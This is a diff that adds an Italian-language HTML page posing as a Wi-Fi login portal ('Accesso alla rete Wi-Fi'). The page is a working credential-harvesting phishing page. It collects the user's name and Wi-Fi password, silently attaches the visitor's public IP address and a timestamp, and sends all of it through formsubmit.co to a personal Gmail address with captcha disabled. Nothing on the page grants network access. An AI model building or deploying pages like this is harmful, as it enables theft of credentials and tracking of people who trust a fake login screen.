@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Accesso Wi-Fi</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background-image: url('sfondo.jpg');
+      background-size: cover;
+      background-position: center;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .contenitore {
+      background-color: rgba(255, 255, 255, 0.8);
+      padding: 30px;
+      border-radius: 10px;
+      text-align: center;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+    }
+
+    input, button {
+      margin: 10px 0;
+      padding: 10px;
+      width: 100%;
+      font-size: 16px;
+    }
+  </style>
+  <script>
+    function preparaInvio() {
+      const ipField = document.getElementById("ip");
+      const dataField = document.getElementById("dataora");
+
+      const now = new Date();
+      dataField.value = now.toLocaleString();
+
+      fetch("https://api.ipify.org?format=json")
+        .then(response => response.json())
+        .then(data => {
+          ipField.value = data.ip;
+          document.getElementById("formWiFi").submit();
+        });
+
+      return false;
+    }
+  </script>
+</head>
+<body>
+  <div class="contenitore">
+    <h2>Accesso alla rete Wi-Fi</h2>
+    <form id="formWiFi" action="https://formsubmit.co/fabio.schinaia@gmail.com" method="POST" onsubmit="return preparaInvio();">
+      <input type="text" name="nome_utente" placeholder="Nome utente" required>
+      <input type="password" name="password" placeholder="Password Wi-Fi" required>
+      <input type="hidden" name="ip_address" id="ip">
+      <input type="hidden" name="data_ora" id="dataora">
+      <input type="hidden" name="_subject" value="Nuovo tentativo di accesso Wi-Fi">
+      <input type="hidden" name="_captcha" value="false">
+      <button type="submit">Connetti</button>
+    </form>
+  </div>
+</body>
+</html>
